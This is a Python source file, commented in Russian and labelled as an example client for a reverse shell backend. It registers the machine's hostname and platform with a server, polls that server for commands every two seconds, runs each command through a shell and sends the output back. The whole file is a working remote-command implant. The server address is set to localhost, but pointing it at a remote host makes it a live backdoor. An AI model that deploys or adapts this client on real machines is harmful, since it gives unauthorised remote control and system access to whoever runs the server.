"""Пример клиента для reverse shell backend."""
import requests
import subprocess
import time
import platform
import socket

SERVER_URL = "http://localhost:5000/api"


def register_client():
    """Регистрация клиента на сервере."""
    data = {
        "hostname": socket.gethostname(),
        "username": platform.node(),
        "platform": platform.system()
    }
    try:
        response = requests.post(f"{SERVER_URL}/register", json=data)
        response.raise_for_status()
        return response.json()["session_id"]
    except Exception as e:
        print(f"Ошибка регистрации: {e}")
        return None


def poll_command(session_id):
    """Опрос сервера на наличие команд."""
    try:
        response = requests.get(f"{SERVER_URL}/poll/{session_id}")
        response.raise_for_status()
        data = response.json()
        if data["status"] == "command_available":
            return data["command"]
        return None
    except Exception as e:
        print(f"Ошибка опроса: {e}")
        return None


def execute_command(command):
    """Выполнение команды и получение результата."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout
        if result.stderr:
            output += "\nSTDERR:\n" + result.stderr
        return output
    except subprocess.TimeoutExpired:
        return "Ошибка: команда превысила лимит времени (30 секунд)"
    except Exception as e:
        return f"Ошибка выполнения: {str(e)}"


def submit_result(session_id, command, output):
    """Отправка результата на сервер."""
    data = {
        "command": command,
        "output": output
    }
    try:
        response = requests.post(f"{SERVER_URL}/result/{session_id}", json=data)
        response.raise_for_status()
        return True
    except Exception as e:
        print(f"Ошибка отправки результата: {e}")
        return False


def main():
    """Основной цикл клиента."""
    print("Подключение к серверу...")
    session_id = register_client()
    
    if not session_id:
        print("Не удалось зарегистрироваться. Проверьте, что сервер запущен.")
        return
    
    print(f"Зарегистрирован с session_id: {session_id}")
    print("Ожидание команд... (Ctrl+C для выхода)")
    
    try:
        while True:
            command = poll_command(session_id)
            if command:
                print(f"\n[Получена команда]: {command}")
                output = execute_command(command)
                print(f"[Результат]:\n{output}")
                submit_result(session_id, command, output)
                print("[Результат отправлен на сервер]")
            time.sleep(2)  # Polling каждые 2 секунды
    except KeyboardInterrupt:
        print("\nЗавершение работы клиента...")


if __name__ == "__main__":
    main()

